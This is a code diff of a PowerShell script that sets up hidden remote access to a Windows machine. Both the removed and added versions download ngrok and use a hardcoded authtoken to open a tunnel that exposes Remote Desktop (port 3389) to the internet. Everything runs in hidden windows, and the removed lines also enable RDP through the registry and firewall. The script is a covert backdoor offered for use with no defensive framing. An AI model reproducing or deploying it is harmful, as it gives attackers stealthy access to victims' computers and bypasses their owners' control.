@@ -1,19 +1,21 @@
-$ngrokToken = "2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua"
-$ngrokPath = "$env:APPDATA\ngrok"
-$ngrokExe = "$ngrokPath\ngrok.exe"
-$zipPath = "$env:TEMP\ngrok.zip"
+Start-Process powershell -WindowStyle Hidden -ArgumentList {
+    $ngrokPath = "$env:APPDATA\ngrok\ngrok.exe"
+    $configPath = "$env:APPDATA\ngrok\ngrok.yml"
 
-Start-Process reg -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb runAs
-netsh advfirewall firewall set rule group="Удаленный рабочий стол" new enable=Yes
+    if (!(Test-Path $ngrokPath)) {
+        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
+        Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok"
+    }
 
-if (-Not (Test-Path $ngrokExe)) {
-    Invoke-WebRequest -Uri "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -OutFile $zipPath
-    Expand-Archive -Path $zipPath -DestinationPath $ngrokPath -Force
+    if (!(Test-Path $configPath)) {
+        @"
+authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
+tunnels:
+  rdp:
+    addr: 3389
+    proto: tcp
+"@ | Out-File -Encoding ASCII $configPath
+    }
+
+    Start-Process -WindowStyle Hidden -FilePath $ngrokPath -ArgumentList "start rdp"
 }
-
-if (-Not (Test-Path "$env:USERPROFILE\.ngrok2\ngrok.yml")) {
-    & $ngrokExe config add-authtoken $ngrokToken
-}
-
-cd $env:USERPROFILE\Downloads
-Start-Process ngrok.exe "tcp 3389" -WindowStyle Hidden
